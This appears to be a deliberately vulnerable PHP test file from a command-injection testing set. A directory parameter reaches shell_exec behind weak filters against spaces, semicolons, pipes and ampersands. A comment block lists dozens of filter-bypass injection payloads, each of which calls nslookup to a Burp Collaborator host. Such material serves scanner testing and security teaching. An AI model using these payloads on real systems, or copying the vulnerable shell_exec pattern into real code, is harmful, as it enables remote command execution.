<?php
# filename: no_space_no_colon_no_pipe_no_ampersand.php
# vulnerable
# sample exploits:
/*
%0A%24%28nslookup%09422.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.
%24%28nslookup%24IFS%249a203.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%00
."`nslookup$IFS$9a1372.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net`".
%0A%24%28nslookup%24IFS%249a533.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.%27
%0Anslookup%24IFS%249a494.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.
.%0A%24%28nslookup%24IFS%249a890.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A
.%22%0A%24%28nslookup%091148.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A%22.
.%60nslookup%24IFS%249a1367.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60.
$(nslookup$IFS$9a211.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net)&
.%22%0A%24%28nslookup%24IFS%249a896.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A%22
.%0A%24%28nslookup%24IFS%249a1250.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.
.$(nslookup$IFS$9a1357.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net).
%60nslookup%24IFS%249a221.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%F0%9F%92%A9
%24%28nslookup%09140.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%00
%60nslookup%09158.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%F0%9F%92%A9
%0A%60nslookup%24IFS%249a566.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.
.%22%0A%60nslookup%09824.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A%22
%24%28nslookup%24IFS%249a26.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29
.%22%0A%60nslookup%24IFS%249a1292.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A%22.
`nslookup$IFS$9a28.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net`
%0A%24%28nslookup%09425.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.%27
.%24%28nslookup%091340.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29.
.%0A%24%28nslookup%091142.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.
%60nslookup%09161.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%00
%0A%60nslookup%09461.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.%27
%24%28nslookup%09146.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A
%24%28nslookup%24IFS%249a209.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A
.%0Anslookup%09746.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A
%0A%24%28nslookup%24IFS%249a530.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.
.%22%24%28nslookup%24IFS%249a1364.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%22.
%0A%60nslookup%09458.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.
%0Anslookup%09386.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.
.%22%60nslookup%24IFS%249a1373.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%22.
.%22%0A%60nslookup%091184.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A%22.
%60nslookup%24IFS%249a29.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60
`nslookup$IFS$9a220.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net`=©
%0Anslookup%09389.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.%27
%24%28nslookup%24IFS%249a200.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%F0%9F%92%A9
.%0Anslookup%24IFS%249a1214.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.
%24%28nslookup%0917.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29
.%60nslookup%091349.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60.
%0Anslookup%09392.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.%22
%0A%24%28nslookup%24IFS%249a536.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.%22
.%0Anslookup%24IFS%249a854.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A
`nslookup$IFS$9a232.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net`&
%60nslookup%24IFS%249a230.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A
$(nslookup$IFS$9a25.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net)
.%0A%60nslookup%09818.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A
.%22%0A%24%28nslookup%24IFS%249a1256.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A%22.
%0A%60nslookup%09464.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.%22
."$(nslookup$IFS$9a1363.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net)".
%0A%60nslookup%24IFS%249a569.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.%27
%24%28nslookup%09137.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%F0%9F%92%A9
.%0A%60nslookup%24IFS%249a926.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A
.%22%0A%24%28nslookup%09788.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A%22
.%22%0A%60nslookup%24IFS%249a932.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A%22
.%22%24%28nslookup%091346.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%22.
%0A%24%28nslookup%09428.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A.%22
%60nslookup%0920.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60
.%24%28nslookup%24IFS%249a1358.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29.
%60nslookup%09167.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A
$(nslookup$IFS$9a199.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net)=©
%0Anslookup%24IFS%249a500.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.%22
.%0Anslookup%091106.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.
.`nslookup$IFS$9a1366.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net`.
.%0A%60nslookup%091178.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.
.%0A%60nslookup%24IFS%249a1286.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.
%60nslookup%24IFS%249a224.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%00
%0Anslookup%24IFS%249a497.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%0A.%27
.%22%60nslookup%091355.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%22.
%0A%60nslookup%24IFS%249a572.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%60%0A.%22
.%0A%24%28nslookup%09782.co4edi1a6hk2gcpxcwsq9ogwpnvjj8.burpcollaborator.net%29%0A
 
*/

if(isset($_GET['dir'])&&!preg_match('/ /',$_GET['dir'])&&!preg_match('/&|\||;/',$_GET['dir']))
{
	 echo "Dir contents are:\n<br />".shell_exec("ls {$_GET['dir']}");
}
?>
<a href="?dir=.">clickme</a>
